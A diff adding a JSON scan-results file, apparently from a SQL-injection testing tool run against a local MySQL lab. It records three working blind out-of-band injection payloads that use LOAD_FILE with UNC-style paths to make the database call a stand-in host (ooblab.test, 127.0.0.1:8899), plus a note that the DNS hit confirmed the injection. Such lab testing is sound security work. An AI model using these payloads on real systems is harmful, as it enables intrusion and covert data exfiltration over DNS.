@@ -1,0 +1,24 @@
+{
+  "generatedAt": "2026-09-11T11:10:04.545Z",
+  "engine": "MySQL 8.0.28 @3307 (secure_file_priv 放行)",
+  "mechanism": "NRPT .ooblab.test → 127.0.0.1:53（等价攻击者权威 NS）",
+  "vulns": [
+    {
+      "id": "Uprm8xbc",
+      "pointId": "de9d0cb9",
+      "technique": "oob",
+      "dbms": "MySQL",
+      "riskLevel": "Medium",
+      "payloads": [
+        "user1' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '127.0.0.1:8899/oob/Bu31iezsYILTs94s'), 0x5c78))-- -",
+        "user1' AND (SELECT LOAD_FILE(CONCAT('//', '127.0.0.1:8899/oob/Bu31iezsYILTs94s', '/x')))-- -",
+        "user1' AND LOAD_FILE(CONCAT(0x5c5c,'s0CsuwPxjfsIIgrD.ooblab.test',0x5c78))-- -"
+      ],
+      "description": "OOB 带外确认（DNS 通道）：token=s0CsuwPxjfsIIgrD 触发目标对 s0CsuwPxjfsIIgrD.ooblab.test 的 DNS 查询被接收端捕获（无回显注入成立）",
+      "evidence": "OOB 带外确认（DNS 通道）：token=s0CsuwPxjfsIIgrD 触发目标对 s0CsuwPxjfsIIgrD.ooblab.test 的 DNS 查询被接收端捕获（无回显注入成立）",
+      "trace": null
+    }
+  ],
+  "dnsHit": true,
+  "anyOob": true
+}
